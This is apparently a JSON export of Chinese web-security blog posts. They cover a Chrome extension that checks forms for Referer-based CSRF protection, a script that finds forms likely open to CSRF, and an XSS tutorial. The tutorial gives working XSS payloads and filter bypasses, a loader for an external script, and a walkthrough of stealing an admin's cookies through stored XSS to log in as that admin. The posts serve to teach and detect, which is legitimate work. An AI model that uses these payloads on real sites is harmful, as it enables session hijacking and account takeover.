this指向的是当前网页 background JavaScript this指向的是插件，用户处理base.js和background.js通信的存在 而上一篇文章的JavaScript代码，都存放在base.js里，待会说“检测Referer机制”时，也是写在这个文件里。 0x03：检测对方是否开启了Referer检测机制 首先为了下面程序的简洁，先把当前表单的action地址赋值给一个变量：actionCache = formDom.attr(&quot;action&quot;); 然后匹配action地址。为什么要匹配action地址呢，因为action分为以下几种情况： #test ./test.php &amp;&amp; ./test(处理方式一样) /test.php?a=11 test.php http://baidu.com/?s= 这里我们使用switch来实现匹配，代码如下：123456789101112131415161718192021222324252627282930switch(actionCache[0])&#123; case \"#\": actionPath = location.href + actionCache; break; case \"/\": actionPath = location.origin + actionCache; break; case \".\": if(actionCache.indexOf(\"?\") != \"-1\")&#123; actionvParameter = \"?\" + actionCache.split(\"?\")[1]; actionCache = actionCache.slice(0,actionCache.indexOf(\"?\")); &#125; if(location.href.split(\"/\").pop().split(\".\").length == 1)&#123; actionPath = location.href + actionCache.substr(1,actionCache.length-1) + actionvParameter; &#125;else&#123; actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache.substring(1,actionCache.length) + actionvParameter; &#125; break; default: if(location.protocol == \"http:\" || location.protocol == \"https:\")&#123; actionPath = location.href; break; &#125; if(location.href.split(\"/\").pop().split(\".\").length == 1)&#123; actionPath = location.href + \"/\" + actionCache; &#125;else&#123; actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache; &#125; break;&#125; 当action地址的第一个值是#时，直接使用location.href + actionCache;拼接。 当action地址的第一个值是/时，使用location.origin + actionCache;来进行拼接 当action地址的第一个值是.时：先使用indexOf函数来把参数赋值给一个变量并去除，1234if(actionCache.indexOf(\"?\") != \"-1\")&#123; actionvParameter = \"?\" + actionCache.split(\"?\")[1]; actionCache = actionCache.slice(0,actionCache.indexOf(\"?\"));&#125; 详细的情况如下： 然后根据有无后缀进行匹配：12345if(location.href.split(\"/\").pop().split(\".\").length == 1)&#123; actionPath = location.href + actionCache.substr(1,actionCache.length-1) + actionvParameter;&#125;else&#123; actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache.substring(1,actionCache.length) + actionvParameter;&#125; location.href.split(&quot;/&quot;).pop().split(&quot;.&quot;).length是检测当前url有无后缀，如果有那么长度是为2.如果没有后缀长度是1。如果没有参数，将不会加任何字符串，因为在初始变量的时候就已经设为空了。详情如下： 除去这些之外，还有直接是文件名或者直接是url，这里呢，我直接写到switch的default分之上去了，因为无法使用actionCache[0]来匹配，代码如下：1234567891011default: if(location.protocol == \"http:\" || location.protocol == \"https:\")&#123; actionPath = location.href; break; &#125; if(location.href.split(\"/\").pop().split(\".\").length == 1)&#123; actionPath = location.href + \"/\" + actionCache; &#125;else&#123; actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(\"/\").pop())) + actionCache; &#125; break; 首先是判断location.protocol是否为http或https协议。如果是的话，直接使用location.href;。当不为http://或者https://的时候，跳过此if判断。接下来就是判断url的后缀存在。如果存在将运行：`actionPath = location.href + “/“ + actionCache;`，反馈如图： 当存在后缀时，运行：actionPath = location.href.substr(location.href,location.href.lastIndexOf(location.href.split(&quot;/&quot;).pop())) + actionCache;。反馈如图： 0x04：模拟form的参数 代码如下：12345678910111213for(var v = 0;v &lt; formDom.find(\":text\").length;v++)&#123; var input = formDom.find(\":text\").eq(v); if(input.attr(\"name\") != \"\")&#123; if(input.val() == \"\")&#123; ajaxParameter += input.attr(\"name\") + \"=\" + \"15874583485&amp;\"; &#125;else&#123; ajaxParameter += input.attr(\"name\") + \"=\" + input.val() + \"&amp;\"; &#125; &#125;else&#123; continue; &#125;&#125;ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1); 使用for循环对当前form表单下属性为text的input标签，然后使用var input = formDom.find(&quot;:text&quot;).eq(v);来进行赋值，把当前的input赋值给input变量。 再使用if判断，当前的input标签是否存在name属性，如果没有，则使用continue;跳出初始化表达式变量为v的本次循环。如果存在，再判断当前的input的value属性里是否有值，如果有值则直接赋值给ajaxParameter。代码：ajaxParameter += input.attr(&quot;name&quot;) + &quot;=&quot; + input.val() + &quot;&amp;&quot;;，如果不存在则把15874583485赋值给ajaxParameter变量，为什么要使用类似于手机号码的呢，因为容错率挺高的。可以看到我在每次赋值的时候，都会在后面加上&amp;字符。因为方便下面发送ajax。当然需要去掉最后一个&amp;。于是乎，有了下面的代码：ajaxParameter = ajaxParameter.substring(0,ajaxParameter.length-1);。 0x04：与插件的background.js进行通信 这里呢，我先说说“检测Referer的思路”，在当前网站发送一次ajax请求，Referer的地址肯定是当前的URL，是正常的，和普通提交form表单是一样的，这里呢，把action地址和method值及参数传给插件，在插件里再发送一次AJAX请求，chrome插件发送AJAX时，Refere是为空的。两次提交，如果存在Referer检测，那么返回的结果长度肯定是不一样的，如果不存在Referer检测，长度是一样的（当然可能存在个别的差异，因为可能要显示时间等，结果长度不一样，但是是不存在“Referer检测”的，下面会增加容错率） Chrome对插件通信提供了发送chrome.runtime.sendMessage和接受chrome.runtime.onMessage.addListener的API。首先让我们来看看base.js文件里的发送chrome.runtime.sendMessageAPI代码:12345678910111213141516$.ajax(&#123; url: actionPath, type: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'get':'post', dataType: 'html', data: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter, async: false,&#125;).done(function(data)&#123; var firstAjax = data.length; var formCache = formDom; chrome.runtime.sendMessage(&#123;action: actionPath, parameter: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter&#125;,function (response) &#123; if(Math.abs(firstAjax - response.status) &lt; 10)&#123; formCache.attr(\"style\",\"border: 1px red solid;\") &#125; &#125;);&#125;) 因为form的method属性的值是不确定的。所以就需要对ajax的参数type进行设置：(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == &#39;get&#39;)?&#39;get&#39;:&#39;post&#39;，这里使用了三目运算符。当method的值不存在、为get的时候，type为get。当存在的时候，则为post。 下面的data参数同理。只不过没有了get、post选项。改为&#39;&#39;:ajaxParameter。因为method值为get时，参数是附在actionPath变量里的。当为post的时候，将把之前拼接的参数传给data参数。这里计算一下返回页面的长度var firstAjax = data.length;，至于下面的为什么要给变量再赋值一次呢，我也不知道，可能下面的Chrome API的作用域不同，导致在下面使用API的时候，使用formDom变量，结果不对。只能重新赋值给formCache变量，这个时候API才算正常。 下面就是Chrome的API了：12345chrome.runtime.sendMessage(&#123;action: actionPath, parameter: (formDom.attr(\"method\") == undefined) || (formDom.attr(\"method\") == 'get')?'':ajaxParameter&#125;,function (response) &#123; if(Math.abs(firstAjax - response.status) &lt; 10)&#123; formCache.attr(\"style\",\"border: 1px red solid;\") &#125; &#125;); 这里的action和parameter是发送的参数及值。至于代码(formDom.attr(&quot;method&quot;) == undefined) || (formDom.attr(&quot;method&quot;) == &#39;get&#39;)?&#39;&#39;:ajaxParameter和上面同理，当为get的时候，不给parameter值，当为post的时候，值为ajaxParameter。response为回调函数，类似ajax的done函数，返回background.js的处理结果。 那background.js是如何处理的呢：123456789101112chrome.runtime.onMessage.addListener(function(message,sender,sendResponse)&#123; $.ajax(&#123; url: message.action, type: (message.parameter == \"\")?'get':'post', dataType: 'html', data: (message.parameter == \"\")?'':message.parameter, async: false, &#125;) .done(function(data) &#123; sendResponse(&#123;status: data.length&#125;) &#125;)&#125;) chrome.runtime.onMessage.addListener是接受函数，然后就是AJAX了，在done函数里，有一个API是sendResponse({status: data.length})返回插件发送AJAX时的长度。这个时候前端base.js将会受到background.js文件的返回结果。代码就返回上面的处理方式了：123if(Math.abs(firstAjax - response.status) &lt; 10)&#123; formCache.attr(\"style\",\"border: 1px red solid;\")&#125; 这里的Math.abs是求绝对值的，当两次ajax返回的长度差值小于10的时候，说明不存在“Referer检测”，当大于10时，就说明存在“检测Referer的机制”了。这里的10就是容错值。 当存在CSRF漏洞的时候，会在form表单的外部包含一个红色的框，如图： 0x05：结尾 这里的token验证机制还是不完整，我会在下一版中解决的。以及JSON Hijacking。有可能存在第四章。 文章非常感谢：北风(2660668090)提供的思路及技术支持。 插件下载地址：http://pan.baidu.com/s/1geMUl7l 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"自动化检测CSRF","slug":"自动化检测CSRF","date":"2016-06-15T12:49:37.000Z","updated":"2016-08-23T16:01:10.801Z","comments":true,"path":"2016/06/15/自动化检测CSRF/","link":"","permalink":"http://bugs.cc/2016/06/15/自动化检测CSRF/","excerpt":"0x00 前言： 之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。","text":"0x00 前言： 之前写过自动化检测XSS插件，今天来一发自动化检测CSRF的插件。CSRF有多种情况的出现方式，而本章所说的内容没有办法做的那么全面，就比如JSON Hijacking（第二章或者第三章会写），本章我们就说说form表单导致的CSRF漏洞。检测form表单类型的CSRF漏洞和检测form表单类型的XSS漏洞最大的不同就是：XSS需要提交才能检测到，而CSRF只需要分析form表单就行了。 0x01 前期的准备工作： 既然要写，那么我们就需要demo来帮我们模拟真实环境的下的情况，而0x00节就说明了，本章只针对于form表单，所以我们的demo也就是各式各样的表单。如下图： 基本上来说网上常见的表单类别都包含了，当然如果你发现有些表单没有加入进去，请说明一下，我将会在下一版中修改。 我们先遍历整个网页上的form表单。代码如下：1234567outerFor:for(var i = 0;i &lt; $(\"form\").length;i++)&#123; var formDom = $(\"form\").eq(i); //formDom代表本次循环的form表单元素 var imageFileSuffix = ['.jpg','.png','.jpge','.ico','.gif','.bmp']; //图片后缀白名单，用户验证图片是否为验证码 var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; //无用表单黑名单，用于验证这个form表单有没有用（针对input验证） var actionFilterKeyword = ['search','find','login','reg']; //无用表单黑名单，用于验证这个form表单有没有用（针对form表单验证）&#125; 至于为什么要加上outerFor:，是因为这只是最外层的for循环，里面还有for循环，为了方便我们在最里层的for循环里跳出最外层的本次循环。在最里层的for循环里我会使用continue outerFor;来跳出最外层for的本次循环。（如果没有看懂，请返回上一行重新看，这很重要） 0x02 去除类似搜索、页面跳转等无用的form表单： 首先我们需要假象一下有没有特殊的form表单，比如没有action属性，把请求交给JavaScript来完成。而这种特殊的form表单也很常见，所以这里我就先使用if判断action是否存在：123if(formDom.attr(\"action\") != undefined)&#123; //当action不为空的时候，进行下一步的操作&#125; 然后就是使用JavaScript的some函数来对action进行判断，当action里的值满足于我们之前设置的黑名单里的字符串时，就直接pass，使用continue来跳出初始化表达式变量为i的本次循环。转化成代码就是下面这样：12345678if(formDom.attr(\"action\") != undefined)&#123; var actionCheck = actionFilterKeyword.some(function(item,index)&#123; return (formDom.attr(\"action\").toLowerCase().indexOf(item) != \"-1\"); &#125;) if(actionCheck)&#123; continue; &#125;&#125; 如果对some函数不明白的，请移步：https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94).aspx.aspx)而在JavaScript里是严格区分大小写的，所以在上面的代码中我使用了toLowerCase()函数，来把action里的值全部转化成小写，然后在其中搜索之前设置的action黑名单，看是否存在。而对比过程如下: action的值–search（如果此次比对为true，则不会向下进行比对） action的值–find …… 其返回的结果是布尔型。在《JavaScript高级程序设计》里是这样说明some函数的: 对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则返回true。 这个时候我们可以看到some前面有一个变量。因为some返回的是布尔型，那么actionCheck变量也是一个布尔型，假设当前这个form表单里的action的值为”/searchArticle.php”。那么就会匹配到黑名单里的search字符串，那么some就会停止向下循环，直接返回true。如下图： 然后使用if判断actionCheck变量。如果为true，那么就使用continue来跳出当前的循环，不向下运行，直接开始下一个循环。 OK,上面的已经完成对form的action属性过滤了，那么下面的将对input进过白名单过滤。12345678910111213for(var x = 0;x &lt; formDom.find(\":text\").length;x++)&#123; var inputTextCheck; var inputText = formDom.find(\":text\").eq(x); if(inputText.attr(\"placeholder\") == undefined)&#123; continue; &#125; inputTextCheck = placeholderFilterKeyword.some(function(item,index)&#123; return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\"); &#125;) if(inputTextCheck)&#123; continue outerFor; &#125;&#125; 首先使用(&quot;:text&quot;)来遍历当前form表单下所有type为text的input标签。 inputTextCheck变量是为了存放some函数的布尔结果。而inputText变量代表了当前的input标签。 然后使用if判断当前input里的placeholder属性是否存在，如果不存在，则跳出初始化表达式变量为x的本次循环。不向下运行，且对下一个input标签进行之前的操作。如果存在且有值的话，if里的表达式会返回false。则这个if判断不会运行，而是向下运行，而代码：123456inputTextCheck = placeholderFilterKeyword.some(function(item,index)&#123; return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\");&#125;)if(inputTextCheck)&#123; continue outerFor;&#125; 和之前判断action的情况的是一样的，这里就不在阐述了。 0x03 去除没有提交按钮的form表单： 为什么要写这个，因为有些form表单不是给用户使用的，他没有提交按钮。对用户来说也是不可见状态。而且也不涉及较为核心的操作，那么我们就需要把这个表单剔除掉。代码如下：123if(formDom.find(\":submit\").length &lt; 1)&#123; continue;&#125; 这段代码较为简单，这里也不在阐述了。 0x04 去除具有token的form表单： 大家都知道对于CSRF来说，具有token的form表单基本是可以断定是不存在CSRF漏洞的了，当然排除同页面存在XSS漏洞和CSRF漏洞。 而token，我们应该怎么样发现呢？type为hidden？name包含token？，不不不。这些都不准确，没办法减少误报和扩大结果。那我们应该怎么做呢？判断type为hidden的input标签里的value值的长度是否大于10。 具有token功能的input标签的特殊性： type为hidden 为了安全起见，token一般是不会小于10位数的。 总是以input标签为媒介的方式传输给后端服务器中。 OK,那么我们可以遍历当前form表单下所有type为hidden的input标签，再判断value值是否大于10。如果大于10，说明这个表单很大程度上是具有token验证的表单，将会被程序丢弃。跳出初始化表达式变量为i的本次循环。把上面的话转化成代码就是下面这样：12345for(var j = 0;j &lt; formDom.find(\":hidden\").length;j++)&#123; if(formDom.find(\":hidden\").eq(j).val().length &gt; 10)&#123; continue outerFor; &#125;&#125; 程序不复杂，复杂的思路。所以这里看起来代码其实也了没多少，而且相当的简单。所以这里就不对代码进行阐述了。 0x05 去除带有验证码的form表单： 有了之前写自动化检测XSS项目的经验，这里思路就清晰多了。获取img的src属性里的值，判断后缀是否为图片格式。代码如下：12345678910111213141516171819if(formDom.find(\"img\").length &gt; 0)&#123; var imageCheck; for(var z = 0;z &lt; formDom.find(\"img\").length;z++)&#123; var img = formDom.find(\"img\").eq(z); var imgSrc = img.attr(\"src\") if(!!imgSrc)&#123; if(imgSrc.indexOf(\"?\") != \"-1\")&#123; imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\")); &#125; imgSrc = imgSrc.substr(imgSrc.lastIndexOf(\".\"),imgSrc.length); imageCheck = imageFileSuffix.some(function(item,index)&#123; return (imgSrc == item); &#125;) if(!imageCheck)&#123; continue outerFor; &#125; &#125; &#125;&#125; 首先使用formDom.find(&quot;img&quot;).length来判断当前的form表单里是否存在图片，如果存在，那么if判断会返回true。进入if判断里面后，首先是一个变量，而这个变量是存放some函数返回的布尔结果的。 然后就是一个for循环，对当前form表单里的img表单进行遍历。而变量img代表了当前的img标签。而imgSrc变量代表了当前img标签里的src。 下面是一段if代码if(!!imgSrc)为什么要这样写呢，是强制把imgSrc变量转成布尔型的，如果当前这个img标签是不存在src属性或没有值的情况下，将会返回false，如果存在src且有值的情况下会返回true。 而下面的代码的是为了剔除?后面的字符串：123if(imgSrc.indexOf(\"?\") != \"-1\")&#123; imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\"));&#125; 为什么要写这样的代码呢？原因很简单，未来防止验证码图片被浏览器缓存，需要再后面跟上问号和随机数字，来达到每刷新一次，就会重新请求这个图片。防止浏览器缓存图片。 而imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&quot;.&quot;),imgSrc.length);这段代码是剔除，除了后缀之外所有的字符串。只保留后缀。举个例子，有段img标签是这样写的：&lt;img src=&quot;https://wwww.baidu.com/code.php?rand=458711541&quot;&gt;，而运行上面的代码后，结果只有.php了，剩下的字符串已经被剔除掉了。 而下面的some函数，和之前是一样的，不做阐述。只是if里面的表达式里多了一个!取反感叹号。为什么要这样写呢。因为之前的都是黑名单的形式，而这里的白名单的形式，既然是相反的，那么就使用!取反就行了。 0x06 其他：整套代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960outerFor:for(var i = 0;i &lt; $(\"form\").length;i++)&#123; var formDom = $(\"form\").eq(i); var imageFileSuffix = ['.jpg','.png','.jpge','.ico','.gif','.bmp']; var placeholderFilterKeyword = ['跳','搜','查','找','登陆','注册','search']; var actionFilterKeyword = ['search','find','login','reg']; //去除类似搜索、页面跳转等无用的form表单 if(formDom.attr(\"action\") != undefined)&#123; var actionCheck = actionFilterKeyword.some(function(item,index)&#123; return (formDom.attr(\"action\").toLowerCase().indexOf(item) != \"-1\"); &#125;) if(actionCheck)&#123; continue; &#125; &#125; for(var x = 0;x &lt; formDom.find(\":text\").length;x++)&#123; var inputTextCheck; var inputText = formDom.find(\":text\").eq(x); if(inputText.attr(\"placeholder\") == undefined)&#123; continue; &#125; inputTextCheck = placeholderFilterKeyword.some(function(item,index)&#123; return (inputText.attr(\"placeholder\").toLowerCase().indexOf(item) != \"-1\"); &#125;) if(inputTextCheck)&#123; continue outerFor; &#125; &#125; //去除没有提交按钮的form表单 if(formDom.find(\":submit\").length &lt; 1)&#123; continue; &#125; //去除具有token的form表单 for(var j = 0;j &lt; formDom.find(\":hidden\").length;j++)&#123; if(formDom.find(\":hidden\").eq(j).val().length &gt; 10)&#123; continue outerFor; &#125; &#125; //去除带有验证码的form表单 if(formDom.find(\"img\").length &gt; 0)&#123; var imageCheck; for(var z = 0;z &lt; formDom.find(\"img\").length;z++)&#123; var img = formDom.find(\"img\").eq(z); var imgSrc = img.attr(\"src\") if(!!imgSrc)&#123; if(imgSrc.indexOf(\"?\") != \"-1\")&#123; imgSrc = imgSrc.slice(0,imgSrc.indexOf(\"?\")); &#125; imgSrc = imgSrc.substr(imgSrc.lastIndexOf(\".\"),imgSrc.length); imageCheck = imageFileSuffix.some(function(item,index)&#123; return (imgSrc == item); &#125;) if(!imageCheck)&#123; continue outerFor; &#125; &#125; &#125; &#125; console.log(formDom)&#125; 这里的console.log(formDom)可以改为ajax等方式发包，或者alert直接提醒此页面可能具有csrf漏洞。至于如何使用，需要大伙手工打包成浏览器插件的形式。而这里我为大家附上我之前写的自动化检测XSS的插件：http://pan.baidu.com/s/1ge5VTcf。大家可以直接解包，修改里面的JavaScript代码为上面完整的代码，再重新打包就行了。 文章呢，还有很多地方不足。而这套程序还只能说是雏形，所以我没有附上直接利用的工具给大家，也是第一次这样。而且有很多地方没有考虑到，比如JSON Hijacking检测。当然下一章会完成的，也会放出可以直接利用的工具。第二章或者第三章可能会把之前写的XSS自动化检测与本章所说的自动化检测CSRF相结合起来。毕竟XSS+CSRF的危害是非常大的。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"XSS的原理分析与解剖","slug":"XSS的原理分析与解剖","date":"2016-05-30T03:27:07.000Z","updated":"2016-08-23T16:02:38.365Z","comments":true,"path":"2016/05/30/XSS的原理分析与解剖/","link":"","permalink":"http://bugs.cc/2016/05/30/XSS的原理分析与解剖/","excerpt":"0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下： 耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底 是一种被动的攻击手法 对website有http-only、crossdomian.xml没有用","text":"0×01 前言: 《xss攻击手法》一开始在互联网上资料并不多(都是现成的代码，没有从基础的开始)，直到刺的《白帽子讲WEB安全》和cn4rry的《XSS跨站脚本攻击剖析与防御》才开始好转。 我这里就不说什么xss的历史什么东西了，xss是一门又热门又不太受重视的Web攻击手法，为什么会这样呢，原因有下： 耗时间 有一定几率不成功 没有相应的软件来完成自动化攻击 前期需要基本的html、js功底，后期需要扎实的html、js、actionscript2/3.0等语言的功底 是一种被动的攻击手法 对website有http-only、crossdomian.xml没有用 但是这些并没有影响黑客对此漏洞的偏爱，原因不需要多，只需要一个“XSS几乎每个网站都存在，google、baidu、360等都存在。” 0x02 原理： 首先我们现在本地搭建个PHP环境(可以使用phpstudy安装包安装)，然后在index.php文件里写入如下代码: 1234567891011121314151617&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;form action=\"\" method=\"get\"&gt; &lt;input type=\"text\" name=\"xss_input\"&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = $_GET['xss_input']; echo '你输入的字符为&lt;br&gt;'.$xss; ?&gt; &lt;/body&gt;&lt;/html&gt; 然后，你会在页面看到这样的页面 我们试着输入abcd123，得到的结果为 我们在看看源代码 我们输入的字符串被原封不动的输出来了，那这里我们提出来一个假设，假设我们在搜索框输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;会出现什么呢？如果按照上面的例子来说，它应该存在第12行的&lt;br&gt;与&lt;/boby&gt;之间，变成&lt;br&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&lt;/boby&gt;，那应该会弹出对话框。 既然假设提出来，那我们来实现下这个假设成不成立吧。 我们输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，得到的页面为 成功弹窗，这个时候基本上就可以确定存在xss漏洞。 我们在看看源代码 看来，我们的假设成功了，这节就说说XSS的原理，下面几节说说xss的构造和利用 0×03 xss利用输出的环境来构造代码: 上节说了xss的原理，但是我们的输出点不一在&lt;br&gt;和&lt;/boby&gt;里，可以出现在html标签的属性里，或者其他标签里面。所以这节很重要，因为不一定 当你输入 &lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;就会弹窗。 先贴出代码:12345678910111213141516171819202122232425&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=\"\" method=\"get\"&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php $xss = $_GET['xss_input_value']; if(isset($xss))&#123; echo '&lt;input type=\"text\" value=\"'.$xss.'\"&gt;'; &#125;else&#123; echo '&lt;input type=\"type\" value=\"输出\"&gt;'; &#125; ?&gt; &lt;/center&gt; &lt;/body&gt;&lt;/html&gt; 下面是代码的页面 这段代码的作用是把第一个输入框的字符串，输出到第二个输入框，我们输入1，那么第二个input里的value值就是1，下面是页面的截图和源代码的截图(这里我输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;来测试) 明显的可以看到，并没有弹出对话框，大家可能会疑惑为什么没有弹窗呢，我们来看看源代码 我们看到我们输入的字符串被输出到第15行input标签里的value属性里面，被当成value里的值来显现出来，所以并没有弹窗，这时候我们该怎么办呢？聪明的人已经发现了可以在&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;前面加个&quot;&gt;来闭合input标签。所以应该得到的结果为 成功弹窗了，我们在看看这时的页面 看到后面有第二个input输入框后面跟有”&gt;字符串，为什么会这样呢，我们来看看源代码 这时可以看到我们构造的代码里面有两个&quot;&gt;，第一个”&gt;是为了闭合input标签，所以第二个&quot;&gt;就被抛弃了，因为html的容错性高，所以并没有像php那样出现错误，而是直接把多余的字符串来输出了，有的人是个完美主义者，不喜欢有多余的字符串被输出，这时该怎么办呢？ 这里我问大家一个问题，我之前说的xss代码里，为什么全是带有标签的。难道就不能不带标签么？！答：当然可以。既然可以不用标签，那我们就用标签里的属性来构造XSS，这样的话，xss代码又少，又不会有多余的字符串被输出来。 还是这个环境，但是不能使用标签，你应该怎么做。想想input里有什么属性可以调用js，html学的好的人，应该知道了，on事件，对的。我们可以用on事件来进行弹窗，比如这个xss代码 我们可以写成&quot; onclick=&quot;alert(&#39;xss&#39;) 这时，我们在来试试，页面会发生什么样的变化吧。 没有看到弹窗啊，失败了么？答案当然是错误的，因为onclick是鼠标点击事件，也就是说当你的鼠标点击第二个input输入框的时候，就会触发onclick事件，然后执行alert(&#39;xss&#39;)代码。我们来试试看 当我点击后，就出现了弹窗，这时我们来看看源代码把 第15行，value值为空，当鼠标点击时，就会弹出对话框。这里可能就会有人问了，如果要点击才会触发，那不是很麻烦么，成功率不就又下降了么。我来帮你解答这个问题，on事件不止onclick这一个，还有很多，如果你想不需要用户完成什么动作就可以触发的话，i可以把onclick改成 onmousemove 当鼠标移动就触发 onload 当页面加载完成后触发 还有很多，我这里就不一一说明了，有兴趣的朋友可以自行查询下。 别以为就这样结束了，还有一类环境不能用上述的方法， 那就是如果在&lt;textarea&gt;标签里呢？！或者其他优先级比script高的呢？ 就下面这样 这时我们该怎么办呢？既然前面都说了闭合属性和闭合标签了，那能不能闭合完整的标签呢，答案是肯定的。我们可以输入&lt;/textarea&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;就可以实现弹窗了。 0×04 过滤的解决办法: 假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写 1234&lt;img scr=1 onerror=alert('xss')&gt; 当找不到图片名为1的文件时，执行alert('xss')&lt;a href=javascrip:alert('xss')&gt;s&lt;/a&gt; 点击s时运行alert('xss')&lt;iframe src=javascript:alert('xss');height=0 width=0 /&gt;&lt;iframe&gt; 利用iframe的scr来弹窗&lt;img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")&gt;&lt;/img&gt; 过滤了alert来执行弹窗 等等有很多的方法，不要把思想总局限于一种上面，记住一句话“xss就是在页面执行你想要的js”其他的管他去。(当然有的时候还要管他…) 0×05 xss的利用: 说了那么多，大家可能都以为xss就是弹窗，其实错了，弹窗只是测试xss的存在性和使用性。 这时我们要插入js代码了，怎么插呢？ 你可以这样 1&lt;script scr=\"js_url\"&gt;&lt;/script&gt; 也可以这样1&lt;img src=x onerror=appendChild(createElement('script')).src='js_url' /&gt; 各种姿势，各种插，只要鞥运行我们的js就OK。那运行我们的js有什么用呢？ Js可以干很多的事，可以获取cookies(对http-only没用)、控制用户的动作(发帖、私信什么的)等等。 比如我们在网站的留言区输入&lt;script scr=&quot;js_url&quot;&gt;&lt;/script&gt;当管理员进后台浏览留言的时候，就会触发，然后管理员的cookies和后台地址还有管理员浏览器版本等等你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies，就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。 至于不会js的怎么写js代码呢，放心网上有很多xss平台，百度一下就可以看到了。页面是傻瓜式的操作，这里就不再过多的说明了。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://bugs.cc/tags/WEB安全/"}]},{"title":"第一篇博文","slug":"第一篇博文","date":"2016-05-28T06:35:25.000Z","updated":"2016-08-23T16:11:51.737Z","comments":true,"path":"2016/05/28/第一篇博文/","link":"","permalink":"http://bugs.cc/2016/05/28/第一篇博文/","excerpt":"","text":"我从事互联网有六个年头了，这个算是我第一个Blog吧，之前一直以“没时间”的借口来安慰自己。现在想好好的总结这六年来的点点滴滴了。也为了以后可以更好的发布自己的见解、文章、工具等。 作者信息： Author:Black-Hole Blog:http://bugs.cc/ github:https://github.com/BlackHole1/ Twitter:https://twitter.com/Free_BlackHole Email:158blackhole@gmail.com","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"http://bugs.cc/tags/随笔/"}]}]}